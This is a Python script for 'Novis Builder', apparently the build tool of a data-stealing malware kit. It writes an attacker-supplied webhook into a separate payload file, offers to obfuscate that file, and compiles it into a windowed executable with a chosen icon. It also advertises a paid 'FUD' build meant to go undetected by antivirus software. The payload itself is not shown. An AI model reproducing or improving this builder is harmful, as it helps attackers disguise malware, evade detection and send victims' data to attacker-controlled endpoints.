from pystyle import *
import os
import subprocess
from colorama import *
import time
from tkinter import filedialog, Tk

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

 ▄▀▀▄ ▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀█▀▄   ▄▀▀▀▀▄ 
█  █ █ █ █      █ █   █    █ █   █  █ █ █   ▐ 
▐  █  ▀█ █      █ ▐  █    █  ▐   █  ▐    ▀▄     by renko & ledger
  █   █  ▀▄    ▄▀    █   ▄▀      █    ▀▄   █  
▄▀   █     ▀▀▀▀       ▀▄▀     ▄▀▀▀▀▀▄  █▀▀▀   
█    ▐                       █       █ ▐      
▐                            ▐       ▐                

                > Press Enter                                         

"""

Anime.Fade(Center.Center(intro), Colors.blue_to_black, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTMAGENTA_EX}

$$\   $$\                     $$\           
$$$\  $$ |                    \__|          
$$$$\ $$ | $$$$$$\ $$\    $$\ $$\  $$$$$$$\ 
$$ $$\$$ |$$  __$$\\$$\  $$  |$$ |$$  _____|
$$ \$$$$ |$$ /  $$ |\$$\$$  / $$ |\$$$$$$\    by renko & ledger
$$ |\$$$ |$$ |  $$ | \$$$  /  $$ | \____$$\ 
$$ | \$$ |\$$$$$$  |  \$  /   $$ |$$$$$$$  |
\__|  \__| \______/    \_/    \__|\_______/                                                                                                 
                                                    
        > Welcome to Novis Builder

""")

time.sleep(1)


while True:
    Write.Print("\nWhich option do you want to choose: ", Colors.green)
    Write.Print("\n1. Build Exe", Colors.blue_to_purple)
    Write.Print("\n2. Build FUD Exe (Virus programs undetected)", Colors.blue_to_purple)
    Write.Print("\n3. Close", Colors.blue_to_purple)
    Write.Print("\nMake your selection: ", Colors.green, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.MAGENTA + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "Novis.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.MAGENTA + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.green)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red)

        answer = input(Fore.MAGENTA + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
        if answer.upper() == "Y":
            answer = input(Fore.MAGENTA + "\nDo you want to add an icon? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                Tk().withdraw()  
                icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
                if icon_file:
                    subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
                    Write.Print(f"\n{filename} has been converted to exe with the selected icon.", Colors.green)
                else:
                    Write.Print("\nThe file you choose must have .ico extension!", Colors.red)
            else:
                subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.green)

    elif choice == "2":
        Write.Print("\nPurchase Novis Premium ---> https://novis.rip | https://discord.gg/debt", Colors.blue_to_purple)

    elif choice == "3":
        Write.Print("\nExiting the program...", Colors.red)
        break

    else:
        Write.Print("\nYou have entered invalid. Please try again.", Colors.red)
